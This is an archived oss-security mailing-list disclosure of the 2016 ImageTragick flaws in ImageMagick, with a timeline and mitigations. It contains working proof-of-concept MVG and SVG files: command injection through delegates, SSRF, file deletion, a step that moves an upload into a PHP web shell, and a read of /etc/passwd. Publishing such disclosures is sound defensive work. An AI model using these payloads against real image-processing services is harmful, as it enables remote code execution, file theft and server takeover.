X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["8709" "Wednesday" "4" "May" "2016" "01:38:49" "+0300" "Karim Valiev" "valievkarim@gmail.com" "<57292879.7050303@gmail.com>" "226" "Re: [oss-security] ImageMagick Is On Fire -- CVE-2016-3714" "^Date:" nil nil "5" "2016050322:38:49" "[oss-security] ImageMagick Is On Fire -- CVE-2016-3714" (number mark "        valievkarim@ May  4  226/8709  " thread-indent "\"Re: [oss-security] ImageMagick Is On Fire -- CVE-2016-3714\"\n") "<20160503181505.GA8195@openwall.com>" ("<CABi+pA7xDJhirUFbrVZQkwMnFj--zbNJA8_Aoq-SiJx0QNcsoA@mail.gmail.com>" "<20160503181505.GA8195@openwall.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 29785 invoked by uid 550); 3 May 2016 22:59:42 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 19854 invoked from network); 3 May 2016 22:39:02 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=subject:to:references:from:message-id:date:user-agent:mime-version
         :in-reply-to:content-transfer-encoding;
        bh=88Ue7naFcsQW0V7FhSnMG/amrkLnwV2iufx9Qq0gmic=;
        b=bh32DrZqPg0axLyPhc/s5LGlY5zplgpqR0r4T2rjF8fsYQOFWewMkr/CCFVMxuLnzs
         sXXzyK5BC8BPMa17oqm1Jy+hDhT9uoqtqBa1fxrWNxHacgOyQnJ/5T5ITOZ0sz+7GHZf
         GPuuXAuJ/0dWjB5h3U7vV9diVjPoY0GsmtYaaKZ5e0jfWhsVUMFmCAsbTfh6jT83nUif
         rLecfPOqLdrOqk+mX3tjyUhQ5q+oZ/LOsy6xdDhjKUt9Ktw/L4vhRlMXxlaOUggklPvB
         8sw4i0dHp60uM8IQJd8oNG4N1EG930RP0y+07MVxzey5E5TOsbuHp3J36SwAq0EHBtoA
         r2rQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:subject:to:references:from:message-id:date
         :user-agent:mime-version:in-reply-to:content-transfer-encoding;
        bh=88Ue7naFcsQW0V7FhSnMG/amrkLnwV2iufx9Qq0gmic=;
        b=B1xQrsALRPh8jJetNVScUmoQoNYaKF5ob3I6TqOwwICsQyxRzDkEN/V143m4sfV3cv
         hv2o+jXoM0yOl2SA/x20S7HXi07WmYdRS+rFApJOjQNxE4rNbbtxhOHOTpW8wI3/CZ54
         ET+DSXJUgnYyYsm2DkdQrAjhcnED8B18sz5kkiLYfk8VoFRymsF84tCFXmojISS0uIL8
         RK8K3M3YXlQKA9/o/gmcUyoNYeNvE+p3OlJzmWSZjH8mjdxhM/WQf0LDqDGp3rTVD3SC
         kwEM2kmI1AbH2XvS6h3ZAV6aV+G1c8/knHBJKhioT6Z/yq1SfWva35TfuTWBghI9xk68
         0azQ==
X-Gm-Message-State: AOPr4FWUqMwufyPfUjRY9ujez90K7/nntNdfu/u9ToZY4W/K55tcXQzeXwiZ0ZvkPuRJOw==
X-Received: by 10.25.135.5 with SMTP id j5mr2518688lfd.15.1462315130607;
        Tue, 03 May 2016 15:38:50 -0700 (PDT)
References: <CABi+pA7xDJhirUFbrVZQkwMnFj--zbNJA8_Aoq-SiJx0QNcsoA@mail.gmail.com>
 <20160503181505.GA8195@openwall.com>
X-Enigmail-Draft-Status: N1110
Message-ID: <57292879.7050303@gmail.com>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101
 Thunderbird/38.5.0
MIME-Version: 1.0
In-Reply-To: <20160503181505.GA8195@openwall.com>
Content-Type: text/plain; charset=windows-1252
Content-Transfer-Encoding: 8bit
Date: Wed, 4 May 2016 01:38:49 +0300
From: Karim Valiev <valievkarim@gmail.com>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] ImageMagick Is On Fire -- CVE-2016-3714
To: oss-security@lists.openwall.com

The exploit was posted at Hacker News comments thread, so it's time to
disclose the full story.

Nikolay Ermishkin from the Mail.Ru Security Team discovered several
vulnerabilities in ImageMagick.
We've reported these issues to developers of ImageMagick and they made a
fix for RCE in sources and released new version (6.9.3-9 released
2016-04-30 http://legacy.imagemagick.org/script/changelog.php), but this
fix seems to be incomplete. We are still working with developers.

ImageMagick: Multiple vulnerabilities in image decoder

1. CVE-2016-3714 - Insufficient shell characters filtering leads to
(potentially remote) code execution

Insufficient filtering for filename passed to delegate's command allows
remote code execution during conversion of several file formats.

ImageMagick allows to process files with external libraries. This
feature is called 'delegate'. It is implemented as a system() with
command string ('command') from the config file delegates.xml with
actual value for different params (input/output filenames etc). Due to
insufficient %M param filtering it is possible to conduct shell command
injection. One of the default delegate's command is used to handle https
requests:
"wget" -q -O "%o" "https:%M"
where %M is the actual link from the input. It is possible to pass the
value like `https://example.com"|ls "-la` and execute unexpected 'ls
-la'. (wget or curl should be installed)

$ convert 'https://example.com"|ls "-la' out.png
total 32
drwxr-xr-x 6 user group 204 Apr 29 23:08 .
drwxr-xr-x+ 232 user group 7888 Apr 30 10:37 ..
...


The most dangerous part is ImageMagick supports several formats like
svg, mvg (thanks to https://hackerone.com/stewie for his research of
this file format and idea of the local file read vulnerability in
ImageMagick, see below), maybe some others - which allow to include
external files from any supported protocol including delegates. As a
result, any service, which uses ImageMagick to process user supplied
images and uses default delegates.xml / policy.xml, may be vulnerable to
this issue.

exploit.mvg
-=-=-=-=-=-=-=-=-
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|ls "-la)'
pop graphic-context

exploit.svg
-=-=-=-=-=-=-=-=-
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="640px" height="480px" version="1.1"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink=
"http://www.w3.org/1999/xlink">
<image xlink:href="https://example.com/image.jpg&quot;|ls &quot;-la"
x="0" y="0" height="640px" width="480px"/>
</svg>

$ convert exploit.mvg out.png
total 32
drwxr-xr-x 6 user group 204 Apr 29 23:08 .
drwxr-xr-x+ 232 user group 7888 Apr 30 10:37 ..
...

ImageMagick tries to guess the type of the file by it's content, so
exploitation doesn't depend on the file extension. You can rename
exploit.mvg to exploit.jpg or exploit.png to bypass file type checks. In
addition, ImageMagick's tool 'identify' is also vulnerable, so it can't
be used as a protection to filter file by it's content and creates
additional attack vectors (e.g. via 'less exploit.jpg', because
'identify' is invoked via lesspipe.sh).
Ubuntu 14.04 and OS X, latest system packages (ImageMagick 6.9.3-7 Q16
x86_64 2016-04-27 and ImageMagick 6.8.6-10 2016-04-29 Q16) and latest
sources from 6 and 7 branches all are vulnerable. Ghostscript and wget
(or curl) should be installed on the system for successful PoC
execution. For svg PoC ImageMagick's svg parser should be used, not rsvg.

All other issues also rely on dangerous ImageMagick feature of external
files inclusion from any supported protocol in formats like svg and mvg.

2. CVE-2016-3718 - SSRF
It is possible to make HTTP GET or FTP request:

ssrf.mvg
-=-=-=-=-=-=-=-=-
push graphic-context
viewbox 0 0 640 480
fill 'url(http://example.com/)'
pop graphic-context

$ convert ssrf.mvg out.png # makes http request to example.com

3. CVE-2016-3715 - File deletion
It is possible to delete files by using ImageMagick's 'ephemeral' pseudo
protocol which deletes files after reading:

delete_file.mvg
-=-=-=-=-=-=-=-=-
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'ephemeral:/tmp/delete.txt'
popgraphic-context

$ touch /tmp/delete.txt
$ convert delete_file.mvg out.png # deletes /tmp/delete.txt

4. CVE-2016-3716 - File moving
It is possible to move image files to file with any extension in any
folder by using ImageMagick's 'msl' pseudo protocol. msl.txt and
image.gif should exist in known location - /tmp/ for PoC (in real life
it may be web service written in PHP, which allows to upload raw txt
files and process images with ImageMagick):

file_move.mvg
-=-=-=-=-=-=-=-=-
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'msl:/tmp/msl.txt'
popgraphic-context

/tmp/msl.txt
-=-=-=-=-=-=-=-=-
<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="/tmp/image.gif" />
<write filename="/var/www/shell.php" />
</image>

/tmp/image.gif - image with php shell inside
(https://www.secgeek.net/POC/POC.gif for example)

$ convert file_move.mvg out.png # moves /tmp/image.gif to /var/www/shell.php

5. CVE-2016-3717 - Local file read (independently reported by original
research author - https://hackerone.com/stewie)
It is possible to get content of the files from the server by using
ImageMagick's 'label' pseudo protocol:

file_read.mvg
-=-=-=-=-=-=-=-=-
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'label:@/etc/passwd'
pop graphic-context

$ convert file_read.mvg out.png # produces file with text rendered from
/etc/passwd


How to mitigate the vulnerability.

Available patches appear to be incomplete.
If you use ImageMagick or an affected library, we recommend you mitigate
the known vulnerabilities by doing at least one these two things (but
preferably both!):
1. Verify that all image files begin with the expected “magic bytes”
corresponding to the image file types you support before sending them to
ImageMagick for processing. (see FAQ for more info)
2. Use a policy file to disable the vulnerable ImageMagick coders. The
global policy for ImageMagick is usually found in “/etc/ImageMagick”.
This policy.xml example will disable the coders EPHEMERAL, URL, MVG, and
MSL:

<policymap>
    <policy domain="coder" rights="none" pattern="EPHEMERAL" />
    <policy domain="coder" rights="none" pattern="URL" />
    <policy domain="coder" rights="none" pattern="HTTPS" />
    <policy domain="coder" rights="none" pattern="MVG" />
    <policy domain="coder" rights="none" pattern="MSL" />
</policymap>


Vulnerability Disclosure Timeline:
April, 21 2016 - file read vulnerability report for one of My.Com
services from https://hackerone.com/stewie received by Mail.Ru Security
Team. Issue is reportedly known to ImageMagic team.
April, 21 2016 - file read vulnerability patched by My.Com development team
April, 28 2016 - code execution vulnerability in ImageMagick was found
by Nikolay Ermishkin from Mail.Ru Security Team while researching
original report
April, 30 2016 - code execution vulnerability reported to ImageMagick
development team
April, 30 2016 - code execution vulnerability fixed by ImageMagick
(incomplete fix)
April, 30 2016 - fixed ImageMagic version 6.9.3-9 published (incomplete fix)
May, 1 2016 - ImageMagic informed of the fix bypass
May, 2 2016 - limited disclosure to 'distros' mailing list
May, 3 2016 - public disclosure at https://imagetragick.com/


-- 
Karim Valiev
Mail.Ru Security Team



On 05/03/2016 09:15 PM, Solar Designer wrote:
> Thank you for bringing this in here, Ryan.
> 
> On Tue, May 03, 2016 at 10:59:12AM -0700, Ryan Huber wrote:
>> What are "magic bytes"?
>>
>> The first few bytes of a file can often used to identify the type of
>> file. Some examples are GIF images, which start with the hex bytes "47
>> 49 46 38", and JPEG images, which start with "FF D8". This list on
>> Wikipedia has the magic bytes for most common file types.
> 
> It may be preferable to refer to ImageMagick's own list of magics.
> HD Moore tweeted the relevant links:
> 
> <hdmoore> Two reasons you probably shouldn't be using ImageMagick in your web applications: https://github.com/ImageMagick/ImageMagick/blob/8c9d68ca4241b6faafa7a35658a125c3500a5edf/MagickCore/magic.c#L89 & https://github.com/ImageMagick/ImageMagick/blob/e93e339c0a44cec16c08d78241f7aa3754485004/www/source/delegates.xml#L62
> <hdmoore> ImageTragick: Upload(meme.png)->(IM detects non-png format based on file magic)->(IM uses insecure delegates to decode)->Shells!
> 
>> ImageMagick also disclosed this on their forum a few hours ago.
> 
> https://www.imagemagick.org/discourse-server/viewtopic.php?f=4&t=29588
> 
> Alexander
> 
